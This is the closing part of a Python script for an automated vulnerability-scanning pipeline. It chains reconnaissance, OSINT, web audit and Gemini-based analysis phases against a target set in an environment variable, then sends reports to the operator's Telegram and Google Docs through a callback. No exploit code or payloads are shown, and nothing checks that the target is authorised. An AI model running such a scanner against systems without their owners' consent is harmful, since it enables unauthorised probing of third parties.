        except Exception as e:
            print(f"  [!] Screenshot system error: {str(e)[:60]}")
            return None


class CallbackDelivery:
    """Send scan results back through the Cloudflare Worker -> GAS pipeline."""
    
    def __init__(self, callback_url, chat_id):
        self.callback_url = callback_url
        self.chat_id = chat_id
    
    def send_status(self, message, status_type="status"):
        """Send a status update to Telegram via the callback."""
        try:
            payload = {
                "chat_id": self.chat_id,
                "text": message,
                "type": status_type,
                "source": "engine.py"
            }
            resp = requests.post(self.callback_url, json=payload, timeout=15)
            return resp.status_code == 200
        except Exception as e:
            print(f"  [!] Status callback failed: {str(e)[:60]}")
            return False
    
    def send_report(self, markdown_report):
        """Send the full report as a Google Doc via the callback."""
        try:
            payload = {
                "chat_id": self.chat_id,
                "report": markdown_report,
                "type": "report",
                "source": "engine.py",
                "filename": f"vapt_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
                "action": "create_doc"
            }
            resp = requests.post(self.callback_url, json=payload, timeout=30)
            data = resp.json() if resp.ok else {}
            
            if data.get("success") or data.get("status") == "success":
                doc_url = data.get("doc_url", data.get("url", ""))
                if doc_url:
                    return doc_url
            return None
            
        except Exception as e:
            print(f"  [!] Report callback failed: {str(e)[:60]}")
            return None
    
    def send_screenshot(self, screenshot_path):
        """Upload and send a screenshot via Drive/Telegram."""
        try:
            with open(screenshot_path, 'rb') as f:
                files = {'photo': f}
                data = {
                    "chat_id": self.chat_id,
                    "type": "screenshot",
                    "source": "engine.py",
                    "filename": os.path.basename(screenshot_path)
                }
                resp = requests.post(self.callback_url, data=data, files=files, timeout=60)
                return resp.ok
        except Exception as e:
            print(f"  [!] Screenshot callback failed: {str(e)[:60]}")
            return False
    
    def send_log(self, log_data):
        """Log scan data to the Google Sheet."""
        try:
            payload = {
                "chat_id": self.chat_id,
                "type": "log",
                "source": "engine.py",
                "log_data": log_data
            }
            resp = requests.post(self.callback_url, json=payload, timeout=15)
            return resp.ok
        except Exception as e:
            print(f"  [!] Log callback failed: {str(e)[:60]}")
            return False


class ScanOrchestrator:
    """Orchestrate the full scan pipeline end-to-end."""
    
    def __init__(self, config):
        self.config = config
        self.target = config.TARGET
        self.callback_url = config.CALLBACK_URL
        self.chat_id = config.CHAT_ID
        self.false_positives = config.FALSE_POSITIVES if hasattr(config, 'FALSE_POSITIVES') else []
        
        # Initialize components
        self.recon = ReconEngine(config)
        self.osint = OSINTEngine(config)
        self.web_audit = WebAuditEngine(config, self.false_positives)
        self.ai_analyzer = AIVulnerabilityAnalyzer(config.GEMINI_API_KEYS)
        self.reporter = None
        self.callback = CallbackDelivery(self.callback_url, self.chat_id)
        self.screenshot = ScreenshotCapture()
        
        self.all_findings = []
        self.scan_start_time = None
        self.scan_end_time = None
    
    def run(self):
        """Execute the complete scan pipeline."""
        self.scan_start_time = datetime.now()
        
        print(f"""
╔══════════════════════════════════════════╗
║     OMNISCIENCE ENGINE - VAPT SCAN       ║
╠══════════════════════════════════════════╣
║ Target: {self.target[:50]:<42}║
║ Started: {self.scan_start_time.strftime('%Y-%m-%d %H:%M:%S'):<42}║
╚══════════════════════════════════════════╝
""")
        
        self.callback.send_status(
            f"🔍 *Omniscience Scan Initiated*\n\n"
            f"**Target:** `{self.target}`\n"
            f"**Started:** {self.scan_start_time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"*Phase 1: Reconnaissance in progress...*"
        )
        
        # Phase 1: Reconnaissance
        print("\n[PHASE 1] Reconnaissance")
        print("─" * 50)
        try:
            recon_results = self.recon.run_full_recon()
            self.all_findings.extend(recon_results.get("findings", []))
            print(f"  [✓] Recon complete - {len(recon_results.get('subdomains', []))} subdomains, "
                  f"{len(recon_results.get('dns_records', {}))} DNS records")
            self.callback.send_status(
                f"📡 *Reconnaissance Complete*\n\n"
                f"**Subdomains:** {len(recon_results.get('subdomains', []))}\n"
                f"**DNS Records:** {len(recon_results.get('dns_records', {}))}\n"
                f"**Technologies:** {len(recon_results.get('technologies', []))}\n\n"
                f"*Phase 2: OSINT in progress...*"
            )
        except Exception as e:
            print(f"  [✗] Recon failed: {str(e)[:80]}")
            self.callback.send_status(f"⚠️ Reconnaissance failed: {str(e)[:80]}")
        
        # Phase 2: OSINT
        print("\n[PHASE 2] OSINT Intelligence Gathering")
        print("─" * 50)
        try:
            osint_results = self.osint.run_full_osint()
            self.all_findings.extend(osint_results.get("findings", []))
            print(f"  [✓] OSINT complete - {len(osint_results.get('leaks', []))} potential leaks, "
                  f"{len(osint_results.get('cloud_assets', []))} cloud assets")
            self.callback.send_status(
                f"🕵️ *OSINT Complete*\n\n"
                f"**Leaks/Exposures:** {len(osint_results.get('leaks', []))}\n"
                f"**Cloud Assets:** {len(osint_results.get('cloud_assets', []))}\n"
                f"**Technologies:** {len(osint_results.get('technologies', []))}\n\n"
                f"*Phase 3: Web Vulnerability Audit in progress...*"
            )
        except Exception as e:
            print(f"  [✗] OSINT failed: {str(e)[:80]}")
        
        # Phase 3: Web Vulnerability Audit
        print("\n[PHASE 3] Web Vulnerability Audit")
        print("─" * 50)
        try:
            web_findings = self.web_audit.run_all_checks(f"https://{self.target}")
            self.all_findings.extend(web_findings)
            
            # Also scan www subdomain
            try:
                web_findings_www = self.web_audit.run_all_checks(f"https://www.{self.target}")
                self.all_findings.extend(web_findings_www)
            except:
                pass
            
            print(f"  [✓] Web audit complete - {len(web_findings)} vulnerabilities found")
            
            # Count by severity
            sev_counts = Counter(f.get("severity", "info") for f in self.all_findings)
            self.callback.send_status(
                f"🌐 *Web Vulnerability Audit Complete*\n\n"
                f"**Critical:** {sev_counts.get('critical', 0)}\n"
                f"**High:** {sev_counts.get('high', 0)}\n"
                f"**Medium:** {sev_counts.get('medium', 0)}\n"
                f"**Low:** {sev_counts.get('low', 0)}\n"
                f"**Info:** {sev_counts.get('info', 0)}\n\n"
                f"*Phase 4: AI Analysis in progress...*"
            )
        except Exception as e:
            print(f"  [✗] Web audit failed: {str(e)[:80]}")
        
        # Phase 4: AI-Powered Analysis
        print("\n[PHASE 4] AI-Powered Vulnerability Analysis")
        print("─" * 50)
        ai_analysis = None
        try:
            if self.all_findings:
                ai_analysis = self.ai_analyzer.analyze_findings(self.all_findings, self.target)
                if ai_analysis:
                    print(f"  [✓] AI analysis complete - {len(ai_analysis.get('critical_findings', []))} critical, "
                          f"{len(ai_analysis.get('high_findings', []))} high priority")
                else:
                    print(f"  [!] AI analysis returned no results")
            else:
                print(f"  [!] No findings to analyze")
        except Exception as e:
            print(f"  [✗] AI analysis failed: {str(e)[:80]}")
        
        # Phase 5: Report Generation
        print("\n[PHASE 5] Report Generation")
        print("─" * 50)
        self.scan_end_time = datetime.now()
        duration = (self.scan_end_time - self.scan_start_time).total_seconds()
        
        self.reporter = ReportGenerator(self.target, self.all_findings, ai_analysis)
        
        try:
            # Generate markdown report
            markdown_report = self.reporter.generate_markdown_report()
            summary = self.reporter.generate_summary_section()
            
            # Save report locally
            report_filename = f"/tmp/vapt_report_{self.target}_{self.scan_start_time.strftime('%Y%m%d_%H%M%S')}.md"
            with open(report_filename, 'w') as f:
                f.write(markdown_report)
            print(f"  [✓] Report saved locally: {report_filename}")
            print(f"  [✓] Report size: {len(markdown_report):,} characters")
            
            # Send report to callback (Google Doc creation)
            self.callback.send_status(
                f"📄 *Generating Report & Creating Google Doc...*\n\n"
                f"Scan completed in **{duration:.0f} seconds**\n"
                f"Total findings: **{len(self.all_findings)}**"
            )
            
            doc_url = self.callback.send_report(markdown_report)
            if doc_url:
                print(f"  [✓] Report uploaded to Google Docs: {doc_url}")
            else:
                print(f"  [!] Report upload returned no URL, sending as status fallback")
                self.callback.send_status(
                    f"📋 *Scan Complete: {self.target}*\n\n"
                    f"{summary}\n\n"
                    f"⏱ Duration: {duration:.0f}s\n"
                    f"📍 Report saved locally: `{report_filename}`"
                )
            
        except Exception as e:
            print(f"  [✗] Report generation failed: {str(e)[:80]}")
            self.callback.send_status(f"⚠️ Report generation failed: {str(e)[:80]}")
        
        # Phase 6: Screenshot Capture
        print("\n[PHASE 6] Screenshot Capture")
        print("─" * 50)
        try:
            screenshot_path = self.screenshot.capture(f"https://{self.target}")
            if screenshot_path:
                self.callback.send_screenshot(screenshot_path)
                print(f"  [✓] Screenshot captured and sent")
            else:
                print(f"  [!] No screenshot captured")
        except Exception as e:
            print(f"  [✗] Screenshot failed: {str(e)[:80]}")
        
        # Phase 7: Log to Google Sheets
        print("\n[PHASE 7] Logging Results")
        print("─" * 50)
        try:
            sev_counts = Counter(f.get("severity", "info") for f in self.all_findings)
            log_entry = {
                "timestamp": self.scan_start_time.isoformat(),
                "target": self.target,
                "duration_seconds": int(duration),
                "total_findings": len(self.all_findings),
                "critical": sev_counts.get("critical", 0),
                "high": sev_counts.get("high", 0),
                "medium": sev_counts.get("medium", 0),
                "low": sev_counts.get("low", 0),
                "info": sev_counts.get("info", 0),
                "status": "completed",
                "false_positives_skipped": len(self.false_positives)
            }
            self.callback.send_log(log_entry)
            print(f"  [✓] Results logged to Google Sheets")
        except Exception as e:
            print(f"  [✗] Logging failed: {str(e)[:80]}")
        
        # Summary
        print(f"""
╔══════════════════════════════════════════╗
║           SCAN COMPLETE                  ║
╠══════════════════════════════════════════╣
║ Target:     {self.target[:42]:<42}║
║ Duration:   {duration:<6.0f}s {"":<36}║
║ Findings:   {len(self.all_findings):<4} {"":<36}║
║ Timestamp:  {self.scan_end_time.strftime('%Y-%m-%d %H:%M:%S'):<42}║
╚══════════════════════════════════════════╝
""")
        
        return {
            "target": self.target,
            "duration": duration,
            "total_findings": len(self.all_findings),
            "findings": self.all_findings,
            "ai_analysis": ai_analysis,
            "report": markdown_report if 'markdown_report' in dir() else None,
            "timestamp": self.scan_end_time.isoformat()
        }


def load_false_positives(config):
    """Load false positive patterns from callback if available."""
    try:
        resp = requests.get(
            f"{config.CALLBACK_URL}?action=get_false_positives&chat_id={config.CHAT_ID}",
            timeout=10
        )
        if resp.ok:
            data = resp.json()
            return data.get("false_positives", [])
    except:
        pass
    return []


def main():
    """Main entry point for the engine."""
    print("""
╔══════════════════════════════════════════╗
║         OMNISCIENCE ENGINE v1.0          ║
║    Automated VAPT Pipeline - 2026        ║
╚══════════════════════════════════════════╝
""")
    
    # Load configuration from environment
    config = Config()
    
    # Validate required config
    if not config.TARGET:
        print("[✗] No target specified. Set TARGET environment variable.")
        sys.exit(1)
    
    if not config.GEMINI_API_KEYS or len(config.GEMINI_API_KEYS) == 0:
        print("[✗] No Gemini API keys configured. Set GEMINI_API_KEY_1 through GEMINI_API_KEY_6.")
        sys.exit(1)
    
    print(f"[*] Target: {config.TARGET}")
    print(f"[*] Callback: {config.CALLBACK_URL}")
    print(f"[*] Chat ID: {config.CHAT_ID}")
    print(f"[*] API Keys: {len(config.GEMINI_API_KEYS)} configured")
    print()
    
    # Load false positives
    false_positives = load_false_positives(config)
    print(f"[*] False positive patterns: {len(false_positives)} loaded")
    print()
    
    # Run the orchestrator
    orchestrator = ScanOrchestrator(config)
    results = orchestrator.run()
    
    print(f"\n[*] Scan pipeline completed successfully.")
    print(f"[*] Total findings: {results['total_findings']}")
    print(f"[*] Duration: {results['duration']:.0f}s")
    
    # Write results to a summary file for GitHub Actions output
    summary_path = os.environ.get("GITHUB_STEP_SUMMARY", "/tmp/scan_summary.md")
    try:
        with open(summary_path, 'w') as f:
            f.write(f"# Scan Results: {config.TARGET}\n\n")
            f.write(f"- **Duration:** {results['duration']:.0f}s\n")
            f.write(f"- **Total Findings:** {results['total_findings']}\n")
            sev_counts = Counter(f.get("severity", "info") for f in results.get("findings", []))
            for sev in ["critical", "high", "medium", "low"]:
                if sev_counts.get(sev, 0) > 0:
                    f.write(f"- **{sev.capitalize()}:** {sev_counts[sev]}\n")
        print(f"[*] Summary written to {summary_path}")
    except:
        pass


if __name__ == "__main__":
    main()
